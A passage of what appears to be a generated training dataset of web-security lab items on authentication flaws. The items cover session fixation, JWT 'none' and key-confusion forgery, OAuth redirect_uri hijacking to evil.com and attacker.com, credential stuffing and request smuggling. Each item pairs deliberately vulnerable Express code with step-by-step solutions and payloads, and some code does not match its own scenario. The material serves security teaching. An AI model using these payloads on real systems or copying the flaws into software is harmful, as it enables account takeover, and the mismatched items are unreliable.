    "4. After Carlos logs in, reuse the known session ID to make an authenticated GET /account request.",
    "5. Verify access to Carlos's account using the fixed session token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text({ type: 'text/xml' })); app.use(cookieParser()); const sessions = {}; const users = { carlos: { password: 'admin123' } }; app.post('/soap/login', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username>.*<password>(.*?)<\\/password>/); if (!match) return res.status(400).send('Malformed request'); const [_, username, password] = match; if (users[username] && users[username].password === password) { const sid = req.cookies['sessionid']; sessions[sid] = username; res.send('<response>Login successful</response>'); } else { res.status(403).send('<response>Invalid credentials</response>'); } }); app.get('/account', (req, res) => { const sid = req.cookies['sessionid']; if (sessions[sid] === 'carlos') { return res.send('Carlos account access'); } res.status(403).send('Access denied'); }); app.listen(3000, () => console.log('SOAP Session Fixation Lab running on port 3000'));",
  "payloads": [
    "Set-Cookie: sessionid=attacker-fixed-id",
    "SOAP POST with sessionid reused after victim login"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion vulnerability in login verification endpoint",
  "Lab Description": "The application uses JWT tokens to manage authentication. It trusts the 'alg' header from the user-provided token and does not enforce a secure algorithm on the server side. This leads to an algorithm confusion flaw. The application accepts tokens signed with 'none'. To solve: forge a JWT token to access the admin panel as user 'admin'.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Intercept the login response with Burp Suite and decode the JWT token from the Authorization header.",
    "2. Use jwt.io or Postman to analyze the JWT structure and note the algorithm used ('HS256').",
    "3. Modify the header to set 'alg' to 'none' and the payload to {\"username\":\"admin\"}.",
    "4. Remove the signature and re-encode the token.",
    "5. Use Burp Repeater to send a request with the forged token in the Authorization header and access /admin."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secretkey', { algorithm: req.body.alg || 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, 'secretkey', { algorithms: [decoded.header.alg] }); if (verified.username === 'admin') return res.send('Welcome Admin'); res.status(403).send('Access denied'); }); app.listen(4000);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
  ]
},
{
  "Lab scenario": "OAuth redirect URI manipulation in OAuth callback",
  "Lab Description": "The application integrates with a third-party OAuth provider. The redirect URI is partially validated and uses string matching to determine legitimacy. This can be bypassed using open redirect techniques. To solve: complete the OAuth login flow and gain a session as 'admin' by hijacking the redirect URI.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Initiate OAuth login and intercept the redirect URL using Burp Suite.",
    "2. Notice the vulnerable validation on 'redirect_uri' that checks if it 'startsWith' a trusted domain.",
    "3. Modify the 'redirect_uri' to include an attacker-controlled domain via open redirect chaining (e.g. https://trusted.example.com@evil.com).",
    "4. Host a page on evil.com that reflects OAuth authorization code.",
    "5. Exchange the code manually using Postman to complete the OAuth flow and gain access to /my-account as admin."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const validRedirectPrefix = 'https://trusted.example.com'; app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query; if (!redirect_uri.startsWith(validRedirectPrefix)) return res.status(400).send('Invalid redirect'); const token = 'admin-session-token'; res.redirect(`${redirect_uri}?token=${token}`); }); app.listen(4000);",
  "payloads": [
    "https://trusted.example.com@evil.com",
    "https://trusted.example.com%2Fevil.com",
    "https://trusted.example.com.redirect.com"
  ]
},
{
  "Lab scenario": "Session fixation in login cookie handling",
  "Lab Description": "The application assigns session identifiers via cookies before authentication. These session IDs are not regenerated after login, allowing session fixation. To solve: fixate a session before login, authenticate with user 'carlos', and hijack the session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to initiate a session before logging in and capture the 'sessionId' cookie.",
    "2. Log in as 'carlos' without refreshing the session (note no new cookie is issued).",
    "3. In a separate browser or Repeater, reuse the same sessionId to access /my-account.",
    "4. Verify session hijack by checking if Carlos's data is displayed.",
    "5. Capture the response and verify user context."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'password123') { const sessionId = req.cookies.sessionId; sessions[sessionId] = username; return res.send('Logged in'); } res.send('Invalid credentials'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) return res.send(`Welcome ${user}`); res.send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "Cookie: sessionId=abc123",
    "POST /login with sessionId=abc123",
    "GET /my-account with sessionId=abc123"
  ]
},
{
  "Lab scenario": "MFA bypass via request smuggling on login route",
  "Lab Description": "The application uses multi-factor authentication, but it is implemented as a second endpoint after initial login. A request smuggling vulnerability allows bypassing MFA by combining requests. To solve: use a smuggled request to send both login and bypass MFA steps in a single POST.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Intercept the login and MFA POSTs using Burp Suite and observe the endpoints (/login and /verify-2fa).",
    "2. Identify request smuggling behavior using Burp Collaborator and inspect transfer-encoding.",
    "3. Craft a smuggled request with both POST bodies using CL.TE format.",
    "4. Chain login credentials and 2FA bypass code into a single payload.",
    "5. Forward the smuggled request to gain access to Carlos’s account page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ username: 'carlos', password: 'password123', mfa: true }]; app.post('/login', (req, res) => { const user = users.find(u => u.username === req.body.username && u.password === req.body.password); if (!user) return res.send('Invalid'); if (user.mfa) return res.send('2FA required'); res.send('Logged in'); }); app.post('/verify-2fa', (req, res) => { if (req.body.code === '000000') return res.send('2FA success'); res.send('Invalid 2FA'); }); app.listen(4000);",
  "payloads": [
    "POST / HTTP/1.1\\r\\nHost: vulnerable.com\\r\\nContent-Length: 100\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n...CL.TE smuggled body with login and 2FA bypass",
    "username=carlos&password=password123\\r\\nPOST /verify-2fa\\r\\ncode=000000"
  ]
},
{
  "Lab scenario": "JWT key confusion using public key as HMAC secret",
  "Lab Description": "The server uses asymmetric keys (RS256) for signing JWTs. However, it incorrectly accepts tokens signed with HS256, interpreting the public key as an HMAC secret. This allows attackers to forge valid tokens. To solve: sign a forged JWT using HS256 and the public key to impersonate 'admin'.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Decode a JWT from the application and observe that it uses RS256 as its algorithm.",
    "2. Obtain the server’s public key (leaked or found in /.well-known/jwks.json or /.well-known/jwt-key).",
    "3. Rebuild the JWT header to use HS256 instead of RS256.",
    "4. Use jwt.io or Postman to sign the new token using the public key as the HMAC secret.",
    "5. Submit the forged token to /admin and verify access is granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); const privateKey = fs.readFileSync('./private.pem'); app.get('/token', (req, res) => { const token = jwt.sign({ username: 'guest' }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }); if (payload.username === 'admin') return res.send('Admin Access Granted'); } catch (e) {} res.status(403).send('Forbidden'); }); app.listen(4000);",
  "payloads": [
    "JWT signed using HS256 with public.pem content as secret, payload: {\"username\":\"admin\"}",
    "Authorization: Bearer [forged-token]"
  ]
},
  {
    "Lab scenario": "Session fixation via predictable session ID in login flow",
    "Lab Description": "This application's session management is flawed. After login, it reuses the same session token provided prior to authentication. The application does not invalidate or regenerate the session ID upon successful login. To solve: Fixate a session for the victim and log in using their credentials, then access their My account page using the fixed session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the application with Burp Suite and note the session cookie set before authentication.",
      "Send a pre-login request to /login and observe the Set-Cookie header.",
      "Craft a malicious link containing the fixed session ID and deliver it to the victim (simulate via cookie injection).",
      "Log in as the victim from another session using their credentials without changing the session ID.",
      "Access the account page using the fixed session ID to confirm takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'adminpass' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid || Math.random().toString(36).slice(2); sessions[sid] = username; res.cookie('sid', sid); res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]) res.send(`Welcome ${sessions[sid]}`); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "GET /login?username=carlos&password=adminpass with Cookie: sid=fixatedvalue",
      "GET /my-account with Cookie: sid=fixatedvalue"
    ]
  },
  {
    "Lab scenario": "JWT tampering via algorithm confusion",
    "Lab Description": "The application uses JWTs for session management, but it does not enforce a strict algorithm validation. It accepts unsigned JWTs when the alg field is set to 'none'. To solve: Modify your JWT to impersonate Carlos by changing the alg header to 'none' and signing out a valid token without a signature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in with your credentials and capture the JWT using Burp Suite.",
      "Decode the JWT header and payload with jwt.io or jwt-tool.",
      "Modify the header to { \"alg\": \"none\", \"typ\": \"JWT\" } and change the payload username to carlos.",
      "Remove the signature part and resend the token using Burp Repeater.",
      "Send a request to /my-account with the tampered JWT in the Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; const users = ['wiener', 'carlos']; app.get('/token', (req, res) => { const { username } = req.query; if (users.includes(username)) { const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.send({ token }); } else { res.status(403).send('Nope'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(auth, { complete: true }); if (decoded?.header?.alg === 'none') { res.send(`Welcome ${decoded.payload.user}`); return; } try { const verified = jwt.verify(auth, secret); res.send(`Welcome ${verified.user}`); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: { \"alg\": \"none\" }, Payload: { \"user\": \"carlos\" }, Signature: (empty)",
      "Authorization: Bearer <header.payload.>"
    ]
  },
  {
    "Lab scenario": "OAuth redirect manipulation in authorization server",
    "Lab Description": "This app integrates with an external OAuth server but does not validate redirect URIs strictly. This allows redirect URI manipulation to hijack tokens. To solve: Intercept the OAuth login flow, manipulate the redirect_uri to an attacker-controlled domain, and extract Carlos's access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow using Burp Suite and note the redirect_uri parameter.",
      "Send the request to Burp Repeater and modify redirect_uri to your exploit server URL.",
      "Send the modified OAuth link to the victim (simulate visit).",
      "Capture the access token leaked to your server in the query string.",
      "Replay a request to the resource server using the stolen token to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123' }; app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; if (tokens[user]) { return res.redirect(`${redirect_uri}?access_token=${tokens[user]}`); } res.status(403).send('Invalid user'); }); app.get('/my-account', (req, res) => { const token = req.query.access_token; const user = Object.keys(tokens).find(u => tokens[u] === token); if (user) res.send(`OAuth Welcome ${user}`); else res.status(401).send('Unauthorized'); }); app.listen(4001);",
    "payloads": [
      "/auth?redirect_uri=https://attacker.com/callback&user=carlos",
      "GET /my-account?access_token=abc123"
    ]
  },
  {
    "Lab scenario": "Session hijacking through verbose error message",
    "Lab Description": "This application exposes session IDs in verbose error messages. These leaked session tokens can be used to hijack user sessions. To solve: Trigger an error, retrieve Carlos's session ID from the response, and reuse it to access his account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to send a malformed request that triggers a stack trace.",
      "Observe the error message for leakage of sensitive variables including session ID.",
      "Extract the session ID linked to Carlos from the verbose output.",
      "Send a GET request to /my-account with the leaked session ID.",
      "Confirm Carlos's account access using the hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = { 'xyz789': 'carlos' }; app.get('/view', (req, res) => { try { const data = JSON.parse(req.query.info); res.send('OK'); } catch (e) { res.status(500).send(`Stack: ${e.stack}\\nSession: xyz789`); } }); app.get('/my-account', (req, res) => { if (req.cookies.sid === 'xyz789') res.send('Session hijacked for carlos'); else res.send('No access'); }); app.listen(3001);",
    "payloads": [
      "/view?info={malformed",
      "Cookie: sid=xyz789"
    ]
  },
  {
    "Lab scenario": "Credential stuffing using leaked password",
    "Lab Description": "The application allows unlimited login attempts and does not implement rate limiting. An attacker can perform credential stuffing attacks using common leaked credentials. To solve: Use a known leaked password for Carlos and gain access to his My account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a login request using Burp Suite and send it to Intruder.",
      "Set payload position on password parameter and fix the username to carlos.",
      "Load a list of common leaked passwords into the payload set.",
      "Start the attack and observe the response lengths or status codes.",
      "Identify the valid password based on a successful response and log in as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'qwerty123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) res.send('Welcome back'); else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { res.send('Account page'); }); app.listen(3002);",
    "payloads": [
      "username=carlos&password=123456",
      "username=carlos&password=password1",
      "username=carlos&password=qwerty123"
    ]
  },
{
  "Lab scenario": "Session Fixation via Insecure Cookie Assignment in REST Login Flow",
  "Lab Description": "This lab demonstrates a session fixation vulnerability within the login flow. The application accepts a `session` cookie from the client and does not invalidate it upon successful login. This flawed design allows an attacker to fixate a session ID prior to login and hijack the victim's authenticated session. To solve: Hijack Carlos's session and access his account page using a pre-assigned session identifier.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept the GET /login request using Burp Suite and observe the application accepts a custom session cookie without validation.",
    "Use Burp to inject a known session cookie (e.g., session=attacker-session) before login and send the request to Repeater.",
    "Forward the session cookie to the victim via social engineering or stored XSS vector (if provided).",
    "Once the victim logs in, reuse the pre-set session cookie (session=attacker-session) to access authenticated areas.",
    "Access /my-account using the fixed session and confirm Carlos's account details are displayed."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'admin123', sessionId: 'sess123' }]; app.get('/login', (req, res) => { const sid = req.cookies.session || 'guest-session'; res.cookie('session', sid); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) res.send('Login successful'); else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const user = users.find(u => u.sessionId === sid); if (user) res.send(`Welcome back, ${user.username}`); else res.status(403).send('Access denied'); }); app.listen(4000);",
  "payloads": [
    "session=sess123",
    "GET /login HTTP/1.1 with session=sess123",
    "POST /login HTTP/1.1 with session=sess123",
    "GET /my-account HTTP/1.1 with session=sess123"
  ]
},
{
  "Lab scenario": "JWT Signature Bypass via 'none' Algorithm in Authorization Header",
  "Lab Description": "This lab simulates a vulnerable JWT validation process that improperly trusts the `alg` field in incoming tokens. The server accepts a token signed with the 'none' algorithm, effectively disabling verification. To solve: Forge a valid JWT granting admin access and access the protected admin panel.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Capture the Authorization: Bearer <token> header in a valid request using Postman or Burp.",
    "Decode the JWT using jwt.io or a local decoder and inspect the header and payload.",
    "Craft a new JWT with `alg` set to `none` and the payload `{\"username\":\"carlos\",\"role\":\"admin\"}`.",
    "Remove the signature part of the JWT and send the token via Authorization header.",
    "Send GET /admin with the forged token and confirm admin panel access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; return next(); } const verified = jwt.verify(token, 'secret'); req.user = verified; next(); } catch (err) { return res.status(403).send('Invalid token'); } }); app.get('/admin', (req, res) => { if (req.user && req.user.role === 'admin') res.send('Welcome to the admin panel'); else res.status(403).send('Access denied'); }); app.listen(4000);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
    "Authorization: Bearer <forged_token>",
    "GET /admin HTTP/1.1 with Authorization header"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration via Redirect URI Manipulation in GraphQL Mutation",
  "Lab Description": "This lab demonstrates a misconfigured OAuth authorization flow implemented through a GraphQL endpoint. The server fails to validate redirect URIs during token exchange, allowing an attacker to intercept authorization codes. To solve: Manipulate the redirect_uri parameter to intercept Carlos’s token and use it to access his account page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Intercept a GraphQL login mutation with Burp and identify the OAuth login mutation fields including redirect_uri.",
    "Change the redirect_uri to a domain you control (e.g., https://evil.com/oauth-callback).",
    "Send the modified mutation, receive the redirected code on your server, and capture it.",
    "Exchange the stolen code for an access_token via the /token endpoint.",
    "Use the token to call /graphql with a query for myAccount and verify Carlos's account is accessible."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const tokens = { 'code123': 'token_carlos' }; const accounts = { 'token_carlos': 'Account info for carlos' }; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('mutation') && query.includes('oauthLogin')) { const redirectUri = query.match(/redirect_uri: \\\"(.*?)\\\"/)[1]; const code = 'code123'; res.json({ data: { oauthLogin: `${redirectUri}?code=${code}` } }); return; } if (query.includes('query') && query.includes('myAccount')) { const auth = req.headers.authorization?.split(' ')[1]; const info = accounts[auth]; if (info) res.json({ data: { myAccount: info } }); else res.status(403).json({ error: 'Forbidden' }); return; } res.status(400).json({ error: 'Invalid request' }); }); app.listen(4000);",
  "payloads": [
    "mutation { oauthLogin(redirect_uri: \"https://evil.com/callback\") }",
    "GET /callback?code=code123",
    "POST /token with code=code123",
    "Authorization: Bearer token_carlos",
    "query { myAccount }"
  ]
},
{
  "Lab scenario": "Session fixation vulnerability in login flow",
  "Lab Description": "This lab’s login endpoint fails to invalidate existing session tokens, allowing an attacker to fix a session ID prior to victim login. The application maintains session state using cookies without rotating them on login. To solve: Hijack Carlos's session by fixing the session ID before they authenticate.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept a pre-login GET request to /login and capture the Set-Cookie header",
    "Send a crafted login POST request as the attacker, appending the victim's session ID manually",
    "Use Burp Repeater to simulate the victim logging in while already having the attacker's session ID set",
    "After victim login, reuse the fixed session token to gain access to /my-account",
    "Confirm session hijack by successfully loading Carlos’s account page"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/></form>'); }); app.post('/login', (req, res) => { const user = users.find(u => u.username === req.body.username && u.password === req.body.password); if (user) { req.session.user = user.username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Sensitive Carlos data'); else res.send('Access Denied'); }); app.listen(3000);",
  "payloads": [
    "GET /login -> Capture session cookie",
    "POST /login with pre-fixed session: session=attackerSessionID",
    "Use same session ID after victim logs in"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in authorization header",
  "Lab Description": "The application accepts JWTs signed using the 'none' algorithm. This allows attackers to forge tokens without knowing the secret. The application fails to validate token integrity correctly. To solve: Forge a token granting access to the admin panel as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to send an authenticated request and capture a valid JWT from the Authorization header",
    "Decode the JWT in jwt.io and analyze the structure and signing algorithm",
    "Change the algorithm to 'none' and craft a new payload with {\"username\": \"carlos\", \"role\": \"admin\"}",
    "Remove the signature part entirely and recompile the JWT",
    "Send a request to /admin using the forged token to gain access"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecretkey'; app.get('/admin', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && (payload.header.alg === 'none' || jwt.verify(token, secret))) { if (payload.payload.role === 'admin') return res.send('Admin access granted'); } res.status(403).send('Forbidden'); }); app.listen(3000);",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
    "JWT: base64(header).base64(payload)."
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in redirect URI handling",
  "Lab Description": "This lab misconfigures its OAuth redirect URI validation, allowing attackers to manipulate the flow to steal authorization codes. The application trusts redirect URIs without exact matching. To solve: Capture Carlos’s authorization code via an open redirect.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to analyze OAuth redirection URLs and locate a redirect_uri parameter",
    "Construct an authorization request using your own attacker-controlled domain as redirect_uri",
    "Send a phishing link to Carlos that initiates OAuth login and redirects to your attacker site",
    "Capture the authorization code from the redirect and use it to request a token",
    "Use the token to access Carlos's profile via /account API"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri, code } = req.query; // Insecure matching res.redirect(`${redirect_uri}?code=steal123`); }); app.get('/account', (req, res) => { if (req.query.token === 'access_token_carlos') res.send('Carlos account data'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
  "payloads": [
    "https://target.com/oauth/authorize?client_id=xyz&redirect_uri=https://evil.com/callback",
    "https://evil.com/callback?code=steal123",
    "POST /token with stolen code"
  ]
},
{
  "Lab scenario": "Credential stuffing vulnerability in verbose login error response",
  "Lab Description": "The login system reveals whether a username exists before verifying passwords, enabling enumeration and credential stuffing attacks. It does not implement rate-limiting or captcha protection. To solve: Identify a valid credential pair for Carlos and access his account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Intruder to fuzz the login endpoint with common usernames and analyze differing responses",
    "Identify the valid username based on the error message: 'Incorrect password' vs 'User not found'",
    "Launch a credential stuffing attack using a list of common passwords",
    "Capture a 302 redirect indicating successful login",
    "Use the valid credentials to access /my-account"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'summer2024' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('User not found'); if (user.password !== password) return res.status(403).send('Incorrect password'); res.send('Login successful'); }); app.listen(3000);",
  "payloads": [
    "POST /login {\"username\":\"carlos\",\"password\":\"123456\"}",
    "POST /login {\"username\":\"carlos\",\"password\":\"summer2024\"}"
  ]
},
{
  "Lab scenario": "Session token reuse vulnerability in GraphQL login mutation",
  "Lab Description": "This GraphQL API issues static session tokens upon login without regenerating them. Attackers can reuse captured tokens to impersonate other users. To solve: Replay Carlos’s token and access his private messages.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Use Burp to intercept a GraphQL mutation for login as Carlos and capture the session token",
    "Replay the captured token in a new request to the /messages endpoint",
    "Verify that the token is accepted and sensitive data is exposed",
    "Access /messages?user=carlos using the token to retrieve private messages",
    "Confirm exploitation by retrieving the flag from the message"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); const sessions = {}; const users = [{ username: 'carlos', password: '1234', token: 'fixedtoken123' }]; app.post('/graphql', (req, res) => { const { query } = req.body; if (query.includes('login')) { const [, username, password] = query.match(/\\\"(.*?)\\\"/g).map(s => s.replace(/\\\"/g, '')); const user = users.find(u => u.username === username && u.password === password); if (user) return res.json({ data: { login: user.token } }); } res.status(401).send('Invalid'); }); app.get('/messages', (req, res) => { if (req.headers.authorization === 'Bearer fixedtoken123') res.send('Private messages from Carlos'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
  "payloads": [
    "POST /graphql {\"query\":\"mutation { login(username: \\\"carlos\\\", password: \\\"1234\\\") }\"}",
    "GET /messages with Header: Authorization: Bearer fixedtoken123"
  ]
},
{
  "Lab scenario": "Session Fixation in Cookie-based Auth Middleware",
  "Lab Description": "The application uses cookie-based sessions but does not regenerate the session ID after login, allowing session fixation attacks. The vulnerable middleware binds session cookies too early in the auth process. To solve: Fixate a session token before login, then reuse it post-authentication to access Carlos's account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept pre-login request using Burp Suite and capture the Set-Cookie header",
    "Use Postman to send login request with fixed session cookie already set",
    "Craft request: set victim credentials with fixed cookie in header",
    "Verify whether session cookie remains unchanged after login",
    "Send authenticated request to /account endpoint using the fixed token to verify Carlos’s session"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixation-vuln', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.user = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { if (req.session.authenticated) { res.send(`Welcome ${req.session.user}`); } else { res.status(403).send('Access Denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
  "payloads": [
    "Set-Cookie: connect.sid=attackersession; Path=/; HttpOnly",
    "POST /login with Cookie: connect.sid=attackersession and valid credentials for carlos"
  ]
},
{
  "Lab scenario": "JWT Authentication Bypass using None Algorithm in Authorization Header",
  "Lab Description": "The app validates JWT tokens but accepts unsigned tokens when the algorithm is set to 'none'. The verification logic fails to check for token integrity. To solve: Craft a JWT using 'none' as algorithm, spoof Carlos’s identity, and access /admin.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept valid JWT token in Authorization: Bearer header",
    "Decode JWT using jwt.io or Postman pre-request script",
    "Craft a new token using { \"alg\": \"none\" } and sub: carlos, omit signature",
    "Replay request with modified Authorization header",
    "Verify admin access by requesting GET /admin"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = ['admin', 'carlos']; app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); if (decoded.sub === 'carlos') return res.send('Welcome Carlos!'); else return res.status(403).send('Access Denied'); } catch (err) { res.status(403).send('Invalid Token'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running on port 4000'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
    "Authorization: Bearer [base64_header].[base64_payload]."
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
  "Lab Description": "The application integrates OAuth with a vulnerable redirect_uri parameter that does not enforce domain validation. This can be exploited via open redirect to steal authorization codes. To solve: Redirect the victim through a crafted URL that leaks Carlos’s OAuth code to your server and log in using the code.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Use Burp or Postman to analyze the OAuth flow between /auth and /callback",
    "Craft an authorization URL with redirect_uri pointing to attacker.com/oauth-leak",
    "Send phishing link to victim to initiate auth flow",
    "Capture leaked code via request to attacker.com",
    "Exchange authorization code for access token using POST /token",
    "Use token to access GET /my-account endpoint as carlos"
  ],
  "Vulnerability name": "Authentication",
